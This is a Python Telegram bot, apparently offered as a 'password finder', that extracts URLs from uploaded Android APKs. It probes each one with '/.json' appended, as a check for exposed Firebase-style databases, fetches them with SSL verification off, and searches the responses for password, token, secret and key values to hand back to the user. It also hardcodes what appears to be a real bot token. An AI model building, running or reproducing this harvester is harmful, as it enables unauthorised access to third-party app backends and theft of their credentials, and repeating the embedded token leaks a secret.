#!/usr/bin/env python3
import asyncio
import aiohttp
import os
import re
import zipfile
import tempfile
import shutil
import json
import sqlite3
import sys
import time
from typing import Dict, Set, Tuple, Optional
from datetime import datetime
import logging

# CONFIG
BOT_TOKEN = "8663292682:AAFVULQdKpE0j0pkqgWopjbour7cm0muypc"
ADMIN_IDS = [8429344650]
MAX_WORKERS = 500
TEST_TIMEOUT = 2
MAX_CONNECTIONS = 500

logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(levelname)-8s | %(message)s", datefmt="%H:%M:%S")
log = logging.getLogger("PWD_BOT")
user_sessions = {}

# Database
DB_PATH = os.path.join('/tmp', 'bot_data.db')
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, verified INTEGER DEFAULT 1, joined_at TEXT)''')
conn.commit()

# Telegram imports - HANDLES BOTH VERSIONS
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, MessageHandler, filters, CallbackQueryHandler, ContextTypes
    MODERN = True
except:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackQueryHandler
    MODERN = False

# ========== BOT FUNCTIONS ==========

async def start(update, context):
    user_id = update.effective_user.id
    log.info(f"🔥 /start from {user_id}")
    
    c.execute("INSERT OR REPLACE INTO users (user_id, verified) VALUES (?, 1)", (user_id,))
    conn.commit()
    
    if user_id in user_sessions:
        await cleanup_session(user_id)
    
    user_sessions[user_id] = {
        'apks': [],
        'temp_dir': tempfile.mkdtemp(),
        'status': 'waiting'
    }
    
    await update.message.reply_text(
        f"👋 Welcome {update.effective_user.first_name}!\n\n🔓 Click below to find passwords from APK files",
        reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("🔓 FIND PASSWORD", callback_data="crack")]
        ])
    )

async def crack_prompt(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'apks': [],
            'temp_dir': tempfile.mkdtemp(),
            'status': 'waiting'
        }
    
    await query.edit_message_text(
        "📦 SEND APK FILE\n\nSend APK file\nType /done when finished\nType /cancel to cancel",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]])
    )

async def handle_apk(update, context):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        user_sessions[user_id] = {
            'apks': [],
            'temp_dir': tempfile.mkdtemp(),
            'status': 'waiting'
        }
    
    if update.message and update.message.text:
        text = update.message.text.strip()
        if text == '/done':
            await process_apks(update, context)
            return
        elif text == '/cancel':
            await cleanup_session(user_id)
            await update.message.reply_text("❌ Cancelled")
            return
    
    if not update.message or not update.message.document:
        return
    
    doc = update.message.document
    file_name = doc.file_name or "unknown.apk"
    
    if not file_name.lower().endswith('.apk'):
        await update.message.reply_text("❌ Please send .apk file")
        return
    
    status_msg = await update.message.reply_text(f"⏳ Processing {file_name[:35]}...")
    
    try:
        file = await doc.get_file()
        temp_dir = user_sessions[user_id]['temp_dir']
        file_path = os.path.join(temp_dir, file_name)
        await file.download_to_drive(file_path)
        
        # Extract APIs
        apis = set()
        try:
            with zipfile.ZipFile(file_path, 'r') as zf:
                if 'resources.arsc' in zf.namelist():
                    with zf.open('resources.arsc') as arsc_file:
                        data = arsc_file.read()
                        text = data.decode('utf-8', errors='ignore')
                        urls = re.findall(r'https?://[a-zA-Z0-9./?=_%:-]+', text)
                        for url in urls:
                            if 15 < len(url) < 500:
                                apis.add(url.rstrip('/') + '/.json')
        except:
            pass
        
        user_sessions[user_id]['apks'].append({
            'name': file_name,
            'apis': list(apis),
            'count': len(apis),
            'path': file_path
        })
        
        total_apks = len(user_sessions[user_id]['apks'])
        total_apis = sum(a['count'] for a in user_sessions[user_id]['apks'])
        
        await status_msg.edit_text(
            f"✅ {file_name[:35]}\n🔗 APIs: {len(apis)}\n📦 Total: {total_apks} APKs | {total_apis} APIs\n\nSend more or type /done"
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {str(e)[:50]}")

async def process_apks(update, context):
    user_id = update.effective_user.id
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ No session. Send /start first")
        return
    
    apks = user_sessions[user_id]['apks']
    if not apks:
        await update.message.reply_text("❌ No APK files")
        return
    
    all_apis = set()
    for apk in apks:
        for api in apk['apis']:
            all_apis.add(api)
    
    total_apis = len(all_apis)
    if total_apis == 0:
        await update.message.reply_text("❌ No APIs found")
        await cleanup_session(user_id)
        return
    
    status_msg = await update.message.reply_text(f"🔍 Testing {total_apis} APIs...")
    
    found_password = None
    working_apis = []
    connector = aiohttp.TCPConnector(limit=MAX_CONNECTIONS)
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for api in all_apis:
            async def test(url):
                async with semaphore:
                    try:
                        timeout = aiohttp.ClientTimeout(total=2, connect=1)
                        async with session.get(url, timeout=timeout, ssl=False) as resp:
                            if resp.status == 200:
                                try:
                                    data = await resp.json()
                                    # Search for password
                                    if data:
                                        def search(obj, depth=0):
                                            if depth > 10:
                                                return None
                                            if isinstance(obj, dict):
                                                for key, value in obj.items():
                                                    key_lower = str(key).lower()
                                                    password_keys = ['password', 'pass', 'pwd', 'passwd', 'pin', 'code', 'admin', 'secret', 'token', 'key']
                                                    for pk in password_keys:
                                                        if pk in key_lower and isinstance(value, str) and 4 <= len(value) <= 20:
                                                            return value
                                                    result = search(value, depth + 1)
                                                    if result:
                                                        return result
                                            elif isinstance(obj, list):
                                                for item in obj:
                                                    result = search(item, depth + 1)
                                                    if result:
                                                        return result
                                            return None
                                        pwd = search(data)
                                        if pwd:
                                            return url, True, pwd
                                    return url, True, None
                            return url, False, None
                    except:
                        return url, False, None
            
            tasks.append(test(api))
        
        tested = 0
        for future in asyncio.as_completed(tasks):
            url, works, password = await future
            tested += 1
            if works:
                working_apis.append(url)
                if password and not found_password:
                    found_password = password
            
            if tested % 50 == 0 or tested == total_apis:
                try:
                    await status_msg.edit_text(f"🔍 Testing: {tested}/{total_apis}\n✅ Working: {len(working_apis)}")
                except:
                    pass
    
    if found_password:
        await status_msg.edit_text(
            f"✅ PASSWORD FOUND ✅\n\n🔓 {found_password}\n\nTap to copy",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton(f"📋 COPY", callback_data=f"copy_{found_password}")],
                [InlineKeyboardButton("🔓 FIND ANOTHER", callback_data="crack")]
            ])
        )
    else:
        await status_msg.edit_text(
            f"❌ NO PASSWORD FOUND\n\nAPKs: {len(apks)}\nAPIs: {total_apis}\nWorking: {len(working_apis)}",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 TRY ANOTHER", callback_data="crack")]
            ])
        )
    
    await cleanup_session(user_id)

async def copy_password(update, context):
    query = update.callback_query
    password = query.data.replace("copy_", "")
    await query.answer(f"📋 Copied: {password}", show_alert=True)

async def cancel_session_callback(update, context):
    query = update.callback_query
    await query.answer()
    await cleanup_session(query.from_user.id)
    await query.edit_message_text("❌ Cancelled")

async def admin_stats(update, context):
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only")
        return
    c.execute("SELECT COUNT(*) FROM users")
    total = c.fetchone()[0]
    await update.message.reply_text(f"📊 Stats\n👥 Users: {total}")

async def cleanup_session(user_id):
    if user_id in user_sessions:
        temp_dir = user_sessions[user_id].get('temp_dir')
        if temp_dir and os.path.exists(temp_dir):
            shutil.rmtree(temp_dir, ignore_errors=True)
        del user_sessions[user_id]

# ========== MAIN ==========

def main():
    log.info("=" * 50)
    log.info("🚀 BOT STARTED - PASSWORD FINDER ACTIVE")
    log.info(f"👑 Admin IDs: {ADMIN_IDS}")
    log.info("=" * 50)
    
    if MODERN:
        # Modern version
        app = Application.builder().token(BOT_TOKEN).build()
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("done", handle_apk))
        app.add_handler(CommandHandler("cancel", handle_apk))
        app.add_handler(CommandHandler("stats", admin_stats))
        app.add_handler(CallbackQueryHandler(crack_prompt, pattern="^crack$"))
        app.add_handler(CallbackQueryHandler(copy_password, pattern="^copy_"))
        app.add_handler(CallbackQueryHandler(cancel_session_callback, pattern="^cancel$"))
        app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
        app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_apk))
        app.run_polling(drop_pending_updates=True)
    else:
        # Legacy version
        from telegram.ext import Filters
        updater = Updater(token=BOT_TOKEN)
        dp = updater.dispatcher
        dp.add_handler(CommandHandler("start", start))
        dp.add_handler(CommandHandler("done", handle_apk))
        dp.add_handler(CommandHandler("cancel", handle_apk))
        dp.add_handler(CommandHandler("stats", admin_stats))
        dp.add_handler(CallbackQueryHandler(crack_prompt, pattern="^crack$"))
        dp.add_handler(CallbackQueryHandler(copy_password, pattern="^copy_"))
        dp.add_handler(CallbackQueryHandler(cancel_session_callback, pattern="^cancel$"))
        dp.add_handler(MessageHandler(Filters.document, handle_apk))
        dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_apk))
        updater.start_polling()
        updater.idle()

if __name__ == "__main__":
    main()
